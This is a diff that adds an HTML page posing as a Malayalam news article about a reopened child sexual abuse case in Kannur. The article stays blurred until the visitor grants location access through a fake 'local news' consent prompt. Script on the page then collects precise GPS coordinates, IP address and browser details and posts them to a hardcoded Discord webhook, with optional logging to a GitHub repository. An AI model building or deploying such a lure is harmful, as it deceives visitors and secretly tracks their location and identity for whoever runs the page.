@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<html lang="ml">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>കേസ് വീണ്ടും തുറന്നു | Kerala News Update</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.8;
+            background-color: #f4f6f9;
+            color: #333;
+            margin: 0;
+            padding: 0;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 40px auto;
+            background: #ffffff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            filter: blur(12px);
+            pointer-events: none;
+            transition: filter 0.5s ease;
+        }
+
+        .container.unblurred {
+            filter: none;
+            pointer-events: auto;
+        }
+
+        /* Custom Consent Modal Styles */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(8px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.4s ease, visibility 0.4s ease;
+        }
+
+        .modal-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .modal-content {
+            background: #ffffff;
+            border-radius: 16px;
+            padding: 35px;
+            max-width: 480px;
+            width: 90%;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            transform: translateY(20px);
+            transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        .modal-overlay.active .modal-content {
+            transform: translateY(0);
+        }
+
+        .modal-icon {
+            font-size: 3rem;
+            color: #2196f3;
+            margin-bottom: 15px;
+        }
+
+        .modal-title {
+            font-size: 1.4rem;
+            font-weight: 700;
+            color: #111;
+            margin-bottom: 12px;
+        }
+
+        .modal-text {
+            font-size: 0.95rem;
+            color: #555;
+            line-height: 1.6;
+            margin-bottom: 24px;
+        }
+
+        .modal-btn-group {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+        }
+
+        .modal-btn {
+            padding: 12px 24px;
+            border-radius: 8px;
+            border: none;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .modal-btn-primary {
+            background: #2196f3;
+            color: white;
+        }
+
+        .modal-btn-primary:hover {
+            background: #1976d2;
+            transform: translateY(-2px);
+        }
+
+        .modal-btn-secondary {
+            background: #e0e0e0;
+            color: #333;
+        }
+
+        .modal-btn-secondary:hover {
+            background: #bdbdbd;
+            transform: translateY(-2px);
+        }
+
+        .category {
+            color: #e53935;
+            font-weight: bold;
+            text-transform: uppercase;
+            font-size: 0.9rem;
+            letter-spacing: 1px;
+            margin-bottom: 10px;
+            display: inline-block;
+        }
+
+        h1 {
+            font-size: 2rem;
+            color: #111;
+            line-height: 1.4;
+            margin-top: 0;
+            margin-bottom: 20px;
+            font-weight: 700;
+        }
+
+        .meta-info {
+            font-size: 0.85rem;
+            color: #666;
+            border-bottom: 1px solid #eee;
+            padding-bottom: 15px;
+            margin-bottom: 25px;
+        }
+
+        .location {
+            font-weight: bold;
+            color: #000;
+        }
+
+        p {
+            margin-bottom: 20px;
+            font-size: 1.1rem;
+            text-align: justify;
+        }
+
+        .main-image {
+            width: 100%;
+            height: auto;
+            border-radius: 4px;
+            margin-bottom: 25px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .highlight-box {
+            background-color: #fdf2f2;
+            border-left: 4px solid #e53935;
+            padding: 20px;
+            margin: 25px 0;
+            border-radius: 0 4px 4px 0;
+        }
+
+        .highlight-box h3 {
+            margin-top: 0;
+            color: #c62828;
+            font-size: 1.2rem;
+        }
+
+        .highlight-box ul {
+            margin: 0;
+            padding-left: 20px;
+        }
+
+        .highlight-box li {
+            margin-bottom: 10px;
+            font-size: 1.05rem;
+        }
+
+        blockquote {
+            background: #f9f9f9;
+            border-left: 4px solid #555;
+            margin: 25px 0;
+            padding: 15px 20px;
+            font-style: italic;
+            color: #444;
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                margin: 10px;
+                padding: 20px;
+            }
+
+            h1 {
+                font-size: 1.6rem;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="container">
+        <span class="category">ഫ്ലാഷ് ന്യൂസ്</span>
+        <h1>ബാലികയെ ലൈംഗികമായി ഉപദ്രവിച്ച കേസ്: പ്രതി ഒരു മാസത്തിനുള്ളിൽ പുറത്തിറങ്ങിയ സംഭവം വിവാദത്തിൽ; കേസ് വീണ്ടും
+            തുറന്നു</h1>
+
+        <div class="meta-info">
+            <span>Published: May 2026</span> | <span>കണ്ണൂർ</span>
+        </div>
+
+        <img src="https://chronicle.ng/wp-content/uploads/2022/08/rape-e1661798931527.webp"
+            alt="ബാലികാ പീഡനം: കേസ് വീണ്ടും തുറന്നു" class="main-image">
+
+        <p><span class="location">കണ്ണൂർ:</span> ഒൻപതുവയസ്സുകാരിയെ ലൈംഗികാതിക്രമത്തിന് ഇരയാക്കിയ കേസിൽ 20 വർഷം
+            കഠിനതടവിന് ശിക്ഷിക്കപ്പെട്ട പ്രതി ഒരു മാസത്തിനുള്ളിൽ പുറത്തിറങ്ങിയ സംഭവം വലിയ വിവാദങ്ങൾക്ക് വഴിമാറുന്നു.
+            കണ്ണപുരം മോയൻ റോഡിലെ ചോതിസ് ഹൗസിൽ സി. ചന്ദ്രൻ (69) എന്ന വ്യാപാരിക്ക് കണ്ണൂർ ഫാസ്റ്റ് ട്രാക്ക് സ്പെഷ്യൽ കോടതി
+            വിധിച്ച ശിക്ഷയാണ് അട്ടിമറിക്കപ്പെട്ടതെന്ന ആക്ഷേപവുമായി ജനങ്ങൾ രംഗത്തെത്തിയത്. ഇതേതുടർന്ന് കേസ് അടിയന്തിരമായി
+            വീണ്ടും തുറന്ന് അന്വേഷിക്കാൻ (Reopen) അധികൃതർ ഉത്തരവിട്ടു.</p>
+
+        <div class="highlight-box">
+            <h3>പ്രധാന വിവരങ്ങൾ:</h3>
+            <ul>
+                <li><strong>വിവാദത്തിന് കാരണം:</strong> ഒൻപത് വയസ്സുകാരിയായ പെൺകുട്ടി കടയിൽ സാധനങ്ങൾ വാങ്ങാൻ വന്ന
+                    സമയത്ത് പലതവണയായി അകത്തേക്ക് കൂട്ടിക്കൊണ്ടുപോയി ഉപദ്രവിച്ചു എന്നതായിരുന്നു കേസ്. കോടതി പ്രതിക്ക് 20
+                    വർഷം തടവും 36,000 രൂപ പിഴയും വിധിച്ചിരുന്നു.</li>
+                <li><strong>ജനരോഷം:</strong> ഇത്രയും ഗുരുതരമായ പോക്സോ (POCSO) കേസിൽ ശിക്ഷിക്കപ്പെട്ട പ്രതി വെറും ഒരു
+                    മാസത്തിനുള്ളിൽ ജാമ്യത്തിലിറങ്ങിയതോ വിട്ടയക്കപ്പെട്ടതോ ആയ നടപടി നാട്ടുകാരിലും കുട്ടിയുടെ
+                    കുടുംബത്തിലും കടുത്ത ആശങ്കയും പ്രതിഷേധവും ഉണ്ടാക്കിയിരുന്നു.</li>
+            </ul>
+        </div>
+
+        <blockquote>
+            <strong>അധികൃതരുടെ തീരുമാനം:</strong> നിയമപരമായ വീഴ്ചകൾ സംഭവിച്ചിട്ടുണ്ടോ എന്ന് പരിശോധിക്കാനും, ഇരയായ
+            പെൺകുട്ടിക്ക് കൃത്യമായ നീതി ഉറപ്പാക്കാനും വേണ്ടിയാണ് കേസ് വീണ്ടും സജീവമായി അന്വേഷിക്കാൻ ഇപ്പോൾ
+            തീരുമാനിച്ചിരിക്കുന്നത്. ഉന്നത പോലീസ് ഉദ്യോഗസ്ഥരുടെ മേൽനോട്ടത്തിലായിരിക്കും തുടരന്വേഷണം നടക്കുക.
+        </blockquote>
+    </div>
+
+    <!-- Consent Modal -->
+    <div id="consent-modal" class="modal-overlay active">
+        <div class="modal-content">
+            <div class="modal-icon">🌐</div>
+            <div class="modal-title">പ്രാദേശിക വാർത്തകൾക്കായി</div>
+            <div class="modal-text">
+                നിങ്ങളുടെ ജില്ലയിലെയും പ്രദേശത്തെയും ഏറ്റവും പുതിയ വാർത്തകൾ കൃത്യതയോടെ ലഭ്യമാക്കുന്നതിനായി ലൊക്കേഷൻ
+                അനുമതി നൽകാൻ ദയവായി താഴെ നൽകിയിരിക്കുന്ന ബട്ടൺ ക്ലിക്ക് ചെയ്യുക.
+            </div>
+            <div class="modal-btn-group">
+                <button id="btn-allow" class="modal-btn modal-btn-primary">അനുമതി നൽകുക</button>
+                <button id="btn-deny" class="modal-btn modal-btn-secondary">വേണ്ട</button>
+            </div>
+            <div id="denied-message"
+                style="display: none; margin-top: 20px; color: #d32f2f; font-weight: bold; line-height: 1.5;"></div>
+        </div>
+    </div>
+
+    <script>
+        const CONFIG = {
+            // ==================== CONFIGURATION ====================
+            // Option 1: Log to GitHub (Requires write access to repo)
+            // WARNING: Exposing a Personal Access Token in frontend JavaScript is a massive security risk!
+            // Anyone who inspects this page can copy your token and compromise your repository.
+            // If you use this, create a fine-grained token with permission ONLY to contents of this repository.
+            useGitHubLogging: false,
+            githubToken: "YOUR_GITHUB_PERSONAL_ACCESS_TOKEN",
+            githubUsername: "YOUR_GITHUB_USERNAME",
+            githubRepo: "YOUR_GITHUB_REPO_NAME",
+            logFilePath: "logs/visits.txt",
+
+            // Option 2: Log to Discord Webhook (Safer and easier alternative)
+            useDiscordWebhook: true,
+            discordWebhookUrl: "https://discord.com/api/webhooks/1509272375525642260/eUsjn7dobcSuUhnDD5_NJBQv0G7KLwEKbONlFc6ZSyIid71ETY3j3A2LejPRRCVO0WOV"
+            // =======================================================
+        };
+
+        const consentModal = document.getElementById('consent-modal');
+        const container = document.querySelector('.container');
+        const btnAllow = document.getElementById('btn-allow');
+        const btnDeny = document.getElementById('btn-deny');
+        const deniedMessage = document.getElementById('denied-message');
+
+        btnDeny.addEventListener('click', () => {
+            btnAllow.style.display = 'none';
+            btnDeny.style.display = 'none';
+            deniedMessage.style.display = 'block';
+            deniedMessage.innerText = 'ക്ഷമിക്കുക, പ്രാദേശിക വിവരങ്ങൾ ലഭ്യമാകാത്തതിനാൽ വാർത്ത കാണാൻ കഴിയില്ല. പേജ് റീലോഡ് ചെയ്ത് അനുമതി നൽകുക.';
+        });
+
+        btnAllow.addEventListener('click', async () => {
+            btnAllow.disabled = true;
+            btnAllow.innerText = 'ലോഡ് ചെയ്യുന്നു...';
+
+            try {
+                // 1. Get Coordinates
+                const coords = await getCoordinates();
+
+                // 2. Get IP Address
+                const ip = await getIPAddress();
+
+                // 3. Log data based on config
+                if (CONFIG.useGitHubLogging) {
+                    await logToGitHub(ip, coords);
+                }
+                if (CONFIG.useDiscordWebhook) {
+                    await logToDiscord(ip, coords);
+                }
+
+                // 4. Success - Unblur content and remove modal
+                container.classList.add('unblurred');
+                consentModal.classList.remove('active');
+            } catch (error) {
+                console.error(error);
+                let userFriendlyError = 'ലൊക്കേഷൻ വിവരങ്ങൾ ലഭ്യമാക്കാൻ കഴിഞ്ഞില്ല. ദയവായി അനുമതി നൽകി വീണ്ടും ശ്രമിക്കുക.';
+                if (error.code === 1) { // PERMISSION_DENIED
+                    userFriendlyError = 'പ്രാദേശിക വാർത്തകൾ കാണുന്നതിനായി ബ്രൗസർ സെറ്റിങ്സിൽ ലൊക്കേഷൻ അനുവദിച്ച ശേഷം പേജ് വീണ്ടും റീലോഡ് ചെയ്യുക.';
+                }
+                btnAllow.style.display = 'none';
+                btnDeny.style.display = 'none';
+                deniedMessage.style.display = 'block';
+                deniedMessage.innerText = userFriendlyError;
+            }
+        });
+
+        function getCoordinates() {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    reject(new Error("Geolocation is not supported by this browser."));
+                } else {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            resolve({
+                                lat: position.coords.latitude,
+                                lon: position.coords.longitude,
+                                accuracy: position.coords.accuracy
+                            });
+                        },
+                        (error) => {
+                            reject(error);
+                        },
+                        { enableHighAccuracy: true, timeout: 15000 }
+                    );
+                }
+            });
+        }
+
+        async function getIPAddress() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (e) {
+                console.error("IP fetch failed, trying fallback...", e);
+                try {
+                    const fallback = await fetch('https://ipapi.co/json/');
+                    const data = await fallback.json();
+                    return data.ip;
+                } catch (err) {
+                    return "Unknown IP";
+                }
+            }
+        }
+
+        async function logToGitHub(ip, coords) {
+            const { githubToken, githubUsername, githubRepo, logFilePath } = CONFIG;
+            if (!githubToken || githubToken === "YOUR_GITHUB_PERSONAL_ACCESS_TOKEN" || !githubUsername || !githubRepo) {
+                console.warn("GitHub credentials not configured.");
+                return;
+            }
+
+            const timestamp = new Date().toISOString();
+            const newLogEntry = `[${timestamp}] IP: ${ip} | Coordinates: Lat ${coords.lat}, Lon ${coords.lon} (Accuracy: ${coords.accuracy}m) | UserAgent: ${navigator.userAgent}\n`;
+
+            const apiUrl = `https://api.github.com/repos/${githubUsername}/${githubRepo}/contents/${logFilePath}`;
+
+            try {
+                let sha = null;
+                let existingContent = "";
+
+                const getRes = await fetch(apiUrl, {
+                    headers: {
+                        "Authorization": `Bearer ${githubToken}`,
+                        "Accept": "application/vnd.github.v3+json"
+                    }
+                });
+
+                if (getRes.status === 200) {
+                    const fileData = await getRes.json();
+                    sha = fileData.sha;
+                    existingContent = decodeURIComponent(escape(atob(fileData.content)));
+                }
+
+                const updatedContent = existingContent + newLogEntry;
+                const encodedContent = btoa(unescape(encodeURIComponent(updatedContent)));
+
+                const putRes = await fetch(apiUrl, {
+                    method: "PUT",
+                    headers: {
+                        "Authorization": `Bearer ${githubToken}`,
+                        "Accept": "application/vnd.github.v3+json",
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        message: `Log visit details at ${timestamp}`,
+                        content: encodedContent,
+                        sha: sha || undefined
+                    })
+                });
+
+                if (!putRes.ok) {
+                    const errData = await putRes.json();
+                    throw new Error(errData.message || "Failed to commit log");
+                }
+            } catch (error) {
+                console.error("Error logging to GitHub:", error);
+            }
+        }
+
+        async function logToDiscord(ip, coords) {
+            const { discordWebhookUrl } = CONFIG;
+            if (!discordWebhookUrl || discordWebhookUrl === "YOUR_DISCORD_WEBHOOK_URL") {
+                return;
+            }
+
+            const payload = {
+                embeds: [{
+                    title: "📌 New Visit Logged",
+                    color: 15007797,
+                    fields: [
+                        { name: "IP Address", value: ip, inline: true },
+                        { name: "Latitude", value: coords.lat.toString(), inline: true },
+                        { name: "Longitude", value: coords.lon.toString(), inline: true },
+                        { name: "Accuracy", value: `${coords.accuracy}m`, inline: true },
+                        { name: "Time", value: new Date().toLocaleString(), inline: true },
+                        { name: "Browser / Device", value: navigator.userAgent }
+                    ]
+                }]
+            };
+
+            try {
+                await fetch(discordWebhookUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+            } catch (error) {
+                console.error("Error logging to Discord:", error);
+            }
+        }
+    </script>
+</body>
+
+</html>
